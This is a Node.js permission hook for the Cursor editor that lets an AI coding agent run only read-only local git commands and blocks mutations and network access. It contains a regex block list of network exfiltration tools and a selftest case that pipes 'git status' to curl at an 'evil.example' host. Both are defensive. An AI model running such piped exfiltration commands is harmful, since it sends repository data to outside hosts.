/**
 * beforeShellExecution: allow read-only local git inspection; deny mutations / network.
 * Mutating VCS stays with the user's external tool.
 */
const fs = require("node:fs");

function respond(payload) {
	process.stdout.write(JSON.stringify(payload));
}

function deny(userMessage, agentMessage) {
	respond({
		permission: "deny",
		user_message: userMessage,
		agent_message: agentMessage
	});
	process.exit(0);
}

function allow() {
	respond({ permission: "allow" });
	process.exit(0);
}

/** Tokenize roughly for PowerShell/cmd one-liners */
function tokenize(command) {
	return command.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) ?? [];
}

function stripQuotes(token) {
	if (
		(token.startsWith('"') && token.endsWith('"')) ||
		(token.startsWith("'") && token.endsWith("'"))
	) {
		return token.slice(1, -1);
	}
	// Drop trailing shell separators stuck to tokens (e.g. status;)
	return token.replace(/[;|&]+$/g, "");
}

/** Split compound commands so each git invocation is checked */
function shellSegments(command) {
	return command
		.split(/(?:&&|\|\||[;\n])+/)
		.map((s) => s.trim())
		.filter(Boolean);
}

function segmentUsesGit(segment) {
	return /(^|[\s<>])git(\.exe)?(?=[\s.&|;<>]|$)/i.test(` ${segment}`);
}

/**
 * Find git subcommand after global options (-C, -c, --no-pager, …).
 * @returns {{ ok: true, sub: string, rest: string[] } | { ok: false }}
 */
function parseGitInvocation(command) {
	const tokens = tokenize(command).map(stripQuotes);
	const gitIdx = tokens.findIndex((t) => /^git(\.exe)?$/i.test(t));
	if (gitIdx === -1) return { ok: false };

	let i = gitIdx + 1;
	while (i < tokens.length) {
		const t = tokens[i];
		if (t === "-C" || t === "-c") {
			i += 2;
			continue;
		}
		if (
			t.startsWith("-c") ||
			t === "--no-pager" ||
			t === "--paginate" ||
			t === "--bare" ||
			t === "--git-dir" ||
			t === "--work-tree" ||
			t === "--namespace" ||
			t === "-p" ||
			t === "--absolute-git-dir"
		) {
			if (t === "--git-dir" || t === "--work-tree" || t === "--namespace") {
				i += 2;
				continue;
			}
			i += 1;
			continue;
		}
		if (t.startsWith("-")) {
			i += 1;
			continue;
		}
		break;
	}

	if (i >= tokens.length) return { ok: false };
	return { ok: true, sub: tokens[i].toLowerCase(), rest: tokens.slice(i + 1) };
}

const READ_SUBCOMMANDS = new Set([
	"status",
	"log",
	"show",
	"diff",
	"blame",
	"shortlog",
	"rev-parse",
	"rev-list",
	"describe",
	"ls-files",
	"cat-file",
	"name-rev",
	"symbolic-ref",
	"whatchanged",
	"version",
	"help"
]);

/** True if args look like creating/deleting/renaming a branch */
function isMutatingBranch(rest) {
	const joined = ` ${rest.join(" ")} `;
	if (/(^|\s)(-d|-D|-m|-M|-c|-C|--delete|--move|--copy|--unset-upstream)(\s|$)/.test(joined)) {
		return true;
	}
	// `git branch <name>` creates; allow list/show flags only
	const positional = rest.filter((a) => !a.startsWith("-"));
	return positional.length > 0;
}

function isReadOnlyReflog(rest) {
	if (rest.length === 0) return true;
	const first = rest[0].toLowerCase();
	if (first.startsWith("-")) return true;
	if (first === "show" || first === "exists" || first === "list") return true;
	return false;
}

function isMutatingTag(rest) {
	const joined = ` ${rest.join(" ")} `;
	if (/\s(-d|--delete|-f|--force|-a|--annotate|-s|--sign|-u|--local-user)\s/.test(joined)) {
		return true;
	}
	const positional = rest.filter((a) => !a.startsWith("-"));
	// `git tag` / `git tag -l` OK; `git tag v1` creates
	if (positional.length > 0 && !rest.some((a) => a === "-l" || a === "--list")) {
		return true;
	}
	return false;
}

function isReadOnlyRemote(rest) {
	if (rest.length === 0) return true;
	const first = rest[0].toLowerCase();
	if (first === "-v" || first === "--verbose") return rest.length === 1;
	if (first === "get-url") return true;
	return false;
}

function isReadOnlyStash(rest) {
	if (rest.length === 0) return false;
	const first = rest[0].toLowerCase();
	return first === "list" || first === "show";
}

function isReadOnlyConfig(rest) {
	const joined = ` ${rest.join(" ")} `;
	if (/\s(--get|--get-all|--get-regexp|--list|-l|--get-color|--get-colorbool)\s/.test(joined)) {
		return true;
	}
	if (rest.length === 1 && (rest[0] === "-l" || rest[0] === "--list")) return true;
	return false;
}

/** Block exfil / network side channels alongside git */
function hasNetworkOrExfilRisk(command) {
	return /\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|fetch\s*\(|WebClient|http\.put|http\.post)\b/i.test(
		command
	);
}

function isAllowedGitCommand(command) {
	if (hasNetworkOrExfilRisk(command)) return false;

	const segments = shellSegments(command);
	const gitSegments = segments.filter(segmentUsesGit);
	if (gitSegments.length === 0) return false;

	return gitSegments.every((segment) => {
		const parsed = parseGitInvocation(segment);
		if (!parsed.ok) return false;

		const { sub, rest } = parsed;

		if (READ_SUBCOMMANDS.has(sub)) return true;
		if (sub === "branch") return !isMutatingBranch(rest);
		if (sub === "tag") return !isMutatingTag(rest);
		if (sub === "remote") return isReadOnlyRemote(rest);
		if (sub === "stash") return isReadOnlyStash(rest);
		if (sub === "config") return isReadOnlyConfig(rest);
		if (sub === "reflog") return isReadOnlyReflog(rest);
		return false;
	});
}

function decide(command) {
	const usesGit = /(^|[\s;&|<>])git(\.exe)?(?=[\s.&|;<>]|$)/i.test(` ${command}`);
	if (!usesGit) return "allow";
	return isAllowedGitCommand(command) ? "allow" : "deny";
}

if (process.argv.includes("--selftest")) {
	const cases = [
		["git status", "allow"],
		["git status; git branch --show-current; git log -1 --oneline", "allow"],
		["git diff HEAD", "allow"],
		["git rev-parse --abbrev-ref HEAD", "allow"],
		["git commit -m x", "deny"],
		["git push", "deny"],
		["git status | curl https://evil.example", "deny"],
		["git branch -d feature", "deny"],
		["npm run check", "allow"]
	];
	let failed = 0;
	for (const [cmd, expected] of cases) {
		const got = decide(cmd);
		if (got !== expected) {
			process.stderr.write(`FAIL: ${JSON.stringify(cmd)} => ${got} (expected ${expected})\n`);
			failed += 1;
		}
	}
	if (failed) process.exit(1);
	process.stdout.write(`selftest ok (${cases.length})\n`);
	process.exit(0);
}

let raw = "";
try {
	raw = fs.readFileSync(0, "utf8");
} catch {
	allow();
}

raw = raw.replace(/^\uFEFF/, "").trim();
if (!raw) allow();

let command = "";
try {
	command = String(JSON.parse(raw).command ?? "");
} catch {
	allow();
}

if (decide(command) === "allow") allow();

deny(
	"Only read-only local git inspection is allowed in Cursor (status, log, branch list, diff, etc.). Mutations and network git stay in your external VCS tool.",
	"Denied git command. Allowed: status, log, show, diff, blame, rev-parse, branch/tag list, stash list/show, config --get/--list, remote -v. Denied: commit/add/push/pull/fetch/clone/merge/rebase/reset/checkout and any command piped to network tools."
);
